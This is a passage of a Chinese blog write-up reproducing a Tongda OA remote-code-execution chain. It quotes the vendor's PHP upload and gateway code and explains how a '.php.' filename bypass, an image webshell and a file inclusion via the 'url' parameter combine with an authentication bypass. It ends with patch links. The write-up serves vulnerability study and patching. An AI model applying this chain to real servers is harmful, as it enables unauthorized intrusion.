class="keyword">else</span> &#123;</span><br><span class="line">                $ATTACH_NAME_UTF8 = $ATTACH_NAME;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/[\\\':&lt;&gt;?]|\\/|\\\\|"|\\|/u'</span>, $ATTACH_NAME_UTF8)) &#123;</span><br><span class="line">                $ERROR_DESC = sprintf(_(<span class="string">'文件名[%s]包含[/\\\'":*?&lt;&gt;|]等非法字符'</span>), $ATTACH_NAME);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ($ATTACH_SIZE == <span class="number">0</span>) &#123;</span><br><span class="line">                $ERROR_DESC = sprintf(_(<span class="string">'文件[%s]大小为0字节'</span>), $ATTACH_NAME);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ($ERROR_DESC == <span class="string">''</span>) &#123;</span><br><span class="line">                $ATTACH_NAME = str_replace(<span class="string">'\''</span>, <span class="string">''</span>, $ATTACH_NAME);</span><br><span class="line">                $ATTACH_ID = add_attach($ATTACH_FILE, $ATTACH_NAME, $MODULE);</span><br><span class="line">                <span class="keyword">if</span> ($ATTACH_ID === <span class="keyword">false</span>) &#123;</span><br><span class="line">                    $ERROR_DESC = sprintf(_(<span class="string">'文件[%s]上传失败'</span>), $ATTACH_NAME);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    $ATTACHMENTS[<span class="string">'ID'</span>] .= $ATTACH_ID . <span class="string">','</span>;</span><br><span class="line">                    $ATTACHMENTS[<span class="string">'NAME'</span>] .= $ATTACH_NAME . <span class="string">'*'</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            @unlink($ATTACH_FILE);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> ($ATTACH_ERROR == UPLOAD_ERR_INI_SIZE) &#123;</span><br><span class="line">                $ERROR_DESC = sprintf(_(<span class="string">'文件[%s]的大小超过了系统限制（%s）'</span>), $ATTACH_NAME, ini_get(<span class="string">'upload_max_filesize'</span>));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> ($ATTACH_ERROR == UPLOAD_ERR_FORM_SIZE) &#123;</span><br><span class="line">                    $ERROR_DESC = sprintf(_(<span class="string">'文件[%s]的大小超过了表单限制'</span>), $ATTACH_NAME);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> ($ATTACH_ERROR == UPLOAD_ERR_PARTIAL) &#123;</span><br><span class="line">                        $ERROR_DESC = sprintf(_(<span class="string">'文件[%s]上传不完整'</span>), $ATTACH_NAME);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> ($ATTACH_ERROR == UPLOAD_ERR_NO_TMP_DIR) &#123;</span><br><span class="line">                            $ERROR_DESC = sprintf(_(<span class="string">'文件[%s]上传失败：找不到临时文件夹'</span>), $ATTACH_NAME);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="keyword">if</span> ($ATTACH_ERROR == UPLOAD_ERR_CANT_WRITE) &#123;</span><br><span class="line">                                $ERROR_DESC = sprintf(_(<span class="string">'文件[%s]写入失败'</span>), $ATTACH_NAME);</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                $ERROR_DESC = sprintf(_(<span class="string">'未知错误[代码：%s]'</span>), $ATTACH_ERROR);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($ERROR_DESC != <span class="string">''</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!$OUTPUT) &#123;</span><br><span class="line">                delete_attach($ATTACHMENTS[<span class="string">'ID'</span>], $ATTACHMENTS[<span class="string">'NAME'</span>], $MODULE);</span><br><span class="line">                <span class="keyword">return</span> $ERROR_DESC;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                Message(_(<span class="string">'错误'</span>), $ERROR_DESC);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $ATTACHMENTS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/article/bdd0a488/image-20200331210529649.png" alt="image-20200331210529649"></p>
+<p>这里调用了<code>is_uploadable</code>对文件名字进行判断,这个函数在1833行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_uploadable</span><span class="params">($FILE_NAME)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $POS = strrpos($FILE_NAME, <span class="string">'.'</span>);</span><br><span class="line">    <span class="keyword">if</span> ($POS === <span class="keyword">false</span>) &#123;</span><br><span class="line">        $EXT_NAME = $FILE_NAME;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (strtolower(substr($FILE_NAME, $POS + <span class="number">1</span>, <span class="number">3</span>)) == <span class="string">'php'</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $EXT_NAME = strtolower(substr($FILE_NAME, $POS + <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (find_id(MYOA_UPLOAD_FORBIDDEN_TYPE, $EXT_NAME)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (MYOA_UPLOAD_LIMIT == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (MYOA_UPLOAD_LIMIT == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> !find_id(MYOA_UPLOAD_LIMIT_TYPE, $EXT_NAME);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (MYOA_UPLOAD_LIMIT == <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> find_id(MYOA_UPLOAD_LIMIT_TYPE, $EXT_NAME);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>首先使用了strrpos来定位<code>.</code>最后出现的位置</p>
+<p><img src="/article/bdd0a488/image-20200331210959228.png" alt="image-20200331210959228"></p>
+<p> 当文件名中不存在”.”时会直接以现有的文件名来作为EXT_NAME,如果存在则从.开始匹配3位，判断后缀是否为php,如果为php则返回false,否则将”.”之前的作为EXT_NAME。 </p>
+<p><strong>因为通达OA搭建在windows环境下，所以可以上传一个<code>.php.</code>后缀的文件</strong>，来绕过文件检测，但是这里问题是上传的文件不在web工作目录下，所以即使上传了也访问不到，所以无法利用</p>
+<h3 id="漏洞二：文件包含"><a href="#漏洞二：文件包含" class="headerlink" title="漏洞二：文件包含"></a>漏洞二：文件包含</h3><p> 这个关键文件的位置在webroot\ispirit\interface\gateway.php，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//decode by http://dezend.qiling.org  QQ 2859470</span></span><br><span class="line"></span><br><span class="line">ob_start();</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">'inc/session.php'</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">'inc/conn.php'</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">'inc/utility_org.php'</span>;</span><br><span class="line"><span class="keyword">if</span> ($P != <span class="string">''</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/[^a-z0-9;]+/i'</span>, $P)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> _(<span class="string">'非法参数'</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    session_id($P);</span><br><span class="line">    session_start();</span><br><span class="line">    session_write_close();</span><br><span class="line">    <span class="keyword">if</span> ($_SESSION[<span class="string">'LOGIN_USER_ID'</span>] == <span class="string">''</span> || $_SESSION[<span class="string">'LOGIN_UID'</span>] == <span class="string">''</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> _(<span class="string">'RELOGIN'</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($json) &#123;</span><br><span class="line">    $json = stripcslashes($json);</span><br><span class="line">    $json = (<span class="keyword">array</span>) json_decode($json);</span><br><span class="line">    <span class="keyword">foreach</span> ($json <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($key == <span class="string">'data'</span>) &#123;</span><br><span class="line">            $val = (<span class="keyword">array</span>) $val;</span><br><span class="line">            <span class="keyword">foreach</span> ($val <span class="keyword">as</span> $keys =&gt; $value) &#123;</span><br><span class="line">                $&#123;$keys&#125; = $value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($key == <span class="string">'url'</span>) &#123;</span><br><span class="line">            $url = $val;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($url != <span class="string">''</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (substr($url, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">'/'</span>) &#123;</span><br><span class="line">            $url = substr($url, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (strpos($url, <span class="string">'general/'</span>) !== <span class="keyword">false</span> || strpos($url, <span class="string">'ispirit/'</span>) !== <span class="keyword">false</span> || strpos($url, <span class="string">'module/'</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">            <span class="keyword">include_once</span> $url;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里首先是不传入参数P就可以进入下面判断语句，之后用到了stripcslashes函数</p>
+<p><img src="/article/bdd0a488/image-20200331211750377.png" alt="image-20200331211750377"></p>
+<p>之后从json中获取url参数的值，之后判断general/、ispirit/、module/是否在url内，如果不在直接跳过下面的include_once $url,如果存在则包含指定URL的文件， 这个是后期进行文件包含的重点</p>
+<h3 id="综合利用"><a href="#综合利用" class="headerlink" title="综合利用"></a>综合利用</h3><p>通过第一个漏洞，绕过认证上传图片木马，然后通过文件包含来包含文件，其中需要注意的是 DEST_UID 不能未空，也不能是php后缀的文件，文件包含中的url请求数据中需要包含 general/、ispirit/、module/三者中的一个 ,这些都在上面的payload中有体现。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>可以看到，各种危害不是很大的漏洞，组合起来危害还是比较大的，尤其是在这个攻击中两次都利用到的认证绕过，起到了关键的作用。通过绕过认证访问到上传接口进行图片马的上传，再结合上文件包含，造成了RCE。</p>
+<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p> V11版：<a href="http://cdndown.tongda2000.com/oa/security/2020_A1.11.3.exe" target="_blank" rel="noopener">http://cdndown.tongda2000.com/oa/security/2020_A1.11.3.exe</a><br>2017版：<a href="http://cdndown.tongda2000.com/oa/security/2020_A1.10.19.exe" target="_blank" rel="noopener">http://cdndown.tongda2000.com/oa/security/2020_A1.10.19.exe</a><br>2016版：<a href="http://cdndown.tongda2000.com/oa/security/2020_A1.9.13.exe" target="_blank" rel="noopener">http://cdndown.tongda2000.com/oa/security/2020_A1.9.13.exe</a><br>2015版：<a href="http://cdndown.tongda2000.com/oa/security/2020_A1.8.15.exe" target="_blank" rel="noopener">http://cdndown.tongda2000.com/oa/security/2020_A1.8.15.exe</a><br>2013增强版：<a href="http://cdndown.tongda2000.com/oa/security/2020_A1.7.25.exe" target="_blank" rel="noopener">http://cdndown.tongda2000.com/oa/security/2020_A1.7.25.exe</a><br>2013版：<a href="http://cdndown.tongda2000.com/oa/security/2020_A1.6.20.exe" target="_blank" rel="noopener">http://cdndown.tongda2000.com/oa/security/2020_A1.6.20.exe</a> </p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://github.com/jas502n/OA-tongda-RCE" target="_blank" rel="noopener">https://github.com/jas502n/OA-tongda-RCE</a></p>
+<p><a href="http://www.tongda2000.com/news/673.php" target="_blank" rel="noopener">http://www.tongda2000.com/news/673.php</a> </p>
+<p><a href="https://xz.aliyun.com/t/7424" target="_blank" rel="noopener">https://xz.aliyun.com/t/7424</a> </p>
+    </div>
+  </div>
+  
+    <div class="copy-right">
+      <div class="markdown-body">
+        <blockquote>
+        
+        
+          本文作者 : JONER <br>
+        
+        原文链接 : <a href>http://joner11234.github.io/article/bdd0a488.html</a><br>
+        版权声明 : 本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
+        </blockquote>
+      </div>
+    </div>
+  
+  
+  
+    <div class="social-share" style="margin-top: -2rem" data-wechat-qrcode-title="<p>微信扫一扫</p>" data-wechat-qrcode-helper="<p>微信右上角, 扫一扫分享</p>" data-sites="qzone, qq, weibo, wechat, douban, google, facebook, twitter">
+  <span style="color: #6b7487; font-size: 1.4rem;">分享到: </span>
+</div>
+<script src="https://cdn.bootcss.com/social-share.js/1.0.16/js/social-share.min.js" async></script>
+  
+
+  
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+      <span>
+        
+          <i class="iconfont icon-06tags"></i>标签: 
+          
+          <span class="span--tag">
+            <a href="/tags/漏洞复现/">
+              #漏洞复现
+            </a>
+          </span>
+          
+        
+      </span>
+    </div>
+    <div class="article-meta pull-right">
+    </div>
+  </div>
+</div>
+
+
+  <aside id="sidebar">
+    <p id="sidebar-header"></p>
+    <ol id="sidebar-toc"></ol>
+  </aside>
+  <script async>setTimeout(generateToc, 10);</script>
+
+
+  <nav class="post-navigation">
+    
+      <div class="nav-pre">
+        <i class="iconfont icon-prev"></i>
+        上一篇:
+        <a href="/article/e9c4751e.html" target="_self">i春秋新春战疫部分题目writeup</a>
+      </div>
+    
+    
+      <div class="nav-next">
+        下一篇:
+        <a href="/article/6ea27749.html" target="_self">Cobalt Strike主机上线及其他功能测试</a>
+        <i class="iconfont icon-next"></i>
+      </div>
+    
+  </nav>
+
+  
+    <a href="#comment" class="comment-anchor"></a>
+<div class="comment-title"><i class="iconfont icon-footprint"></i> 留下足迹 <i class="iconfont icon-footprint"></i></div>
+<div id="vcomments"></div>
+
+<script defer>
+  if( true ) {
+    let path = getRealPath()
+    new Valine({
+      el: "#vcomments",
+      appId: "1NXTyN2WX8S3WVndpU432Q6j-gzGzoHsz",
+      appKey: "qKRwkiwKUs1Q6PynhoYXoF4t",
+      notify: false,
+      verify: false,
+      avatar: "robohash",
+      placeholder: "正确填写邮箱, 才能及时收到回复哦♪(^∇^*)",
+      path
+    });
+  }
+</script>
+   
+
+   
+
+</div>
+
+
+      <footer>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  <p class="site-info">
+    博客已运行<span id="time-to-now"></span><span class="my-face">👦</span>
+    <br>
+    
+  </p>
+  <span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+</footer>
+
+
+
+<script>
+const timeToNowDOM = document.querySelector("#time-to-now");
+const startTimestamp = new Date(2019, 3, 2).getTime();
+
+const updateTimeStr = () => {
+  let offset = parseInt(
+      (new Date().getTime() - startTimestamp) / 1000,
+      10
+    ),
+    day = Math.floor(offset / 86400),
+    hour = Math.floor((offset % 86400) / 3600),
+    minute = Math.floor(((offset % 86400) % 3600) / 60),
+    second = Math.floor(((offset % 86400) % 3600) % 60);
+  timeToNowDOM.innerHTML =
+    day + "天" + hour + "小时" + minute + "分钟" + second + "秒";
+  setTimeout(updateTimeStr, 500);
+}
+
+setTimeout(updateTimeStr, 500);
+</script>
+
+
+      <div class="back-to-top hidden">
+  <span>
+    <i class="iconfont icon-60"></i><span></span>%
+  </span>
+</div>
+
+<script>
+const updateIconToTop = percent => {
+  let dom = document.querySelector(".back-to-top span span");
+  dom.innerText = percent;
+  if(percent < 1) {
+    document.querySelector(".back-to-top").className = "back-to-top hidden";
+  } else {
+    document.querySelector(".back-to-top").className = "back-to-top";
+  }
+}
+
+const handleScoll = () => {
+  let isRunning = false;
+  return () => {
+    if (isRunning) return;
+    isRunning = true;
+    window.requestAnimationFrame(timestamp => {
+      let scrollTop =
+          document.documentElement.scrollTop || document.body.scrollTop,
+        scrollHeight =
+          document.documentElement.scrollHeight ||
+          document.body.scrollHeight,
+        clientHeight =
+          document.documentElement.clientHeight ||
+          document.body.clientHeight;
+      isRunning = false;
+      if (scrollTop <= 1) {
+        updateIconToTop(0);
+        return;
+      }
+      if (scrollTop + clientHeight >= scrollHeight) {
+        updateIconToTop(100);
+      } else {
+        updateIconToTop(parseInt(
+          100 * scrollTop / (scrollHeight - clientHeight),
+          10
+        ));
+      }
+    });
+  };
+}
+
+const backToTop = () => {
+  let scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop,
+    delay = 10,
+    time = 200;
+  if (scrollTop <= 20) {
+    document.documentElement.scrollTop = 0;
+    document.body.scrollTop = 0;
+    return;
+  }
+  let step = Math.ceil(scrollTop * delay / time);
+  let timer = setInterval(() => {
+    scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop;
+    if (scrollTop - step <= 0) {
+      document.documentElement.scrollTop = 0;
+      document.body.scrollTop = 0;
+      clearInterval(timer);
+    } else {
+      document.documentElement.scrollTop = scrollTop - step;
+      document.body.scrollTop = scrollTop - step;
+    }
+  }, delay);
+}
+
+document.addEventListener("scroll", handleScoll(), false);
+
+document.querySelector(".back-to-top").addEventListener("click", backToTop, false);
+
+</script>
+
+    </div>
+
+    
+      <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+<script>
+  (() => {
+    const mathjaxConfig = {
+      showProcessingMessages: false, //关闭js加载过程信息
+      messageStyle: "none", //不显示信息
+      jax: ["input/TeX", "output/HTML-CSS"],
+      tex2jax: {
+        inlineMath: [["$", "$"], ["\\(", "\\)"]], //行内公式选择符
+        displayMath: [["$$", "$$"], ["\\[", "\\]"]], //段内公式选择符
+        skipTags: ["script", "noscript", "style", "textarea", "pre", "code", "a"] //避开某些标签
+      },
+      "HTML-CSS": {
+        availableFonts: ["STIX", "TeX"], //可选字体
+        showMathMenu: false //关闭右击菜单显示
+      }
+    }
+
+    let mathjaxInterval = setInterval(() => {
+      if(!window.MathJax){
+        return;
+      }
+      window.MathJax.Hub.Config(mathjaxConfig)
+      window.MathJax.Hub.Queue(["Typeset", MathJax.Hub, document.getElementById('app')])
+
+      clearInterval(mathjaxInterval)
+    }, 10)    
+  })()
+</script>
+    
+
+    <script src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js" async></script>
+<script async>
+  let fancyTimer = setInterval(function(){
+    if(!window.$){
+      return;
+    }
+    $(document).ready(function() {
+      $(".post img").each(function () {
+        if($(this).parent().get(0).tagName.toLowerCase() === "a") {
+          return;
+        }
+        // $(this).attr("data-fancybox", "gallery"); // if you add 'data-fancybox', img will display after showed
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "gallery");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      });
+      
+      clearInterval(fancyTimer);
+    });
+  }, 10);
+</script>
+
+    
+  </body>
+
+</html>
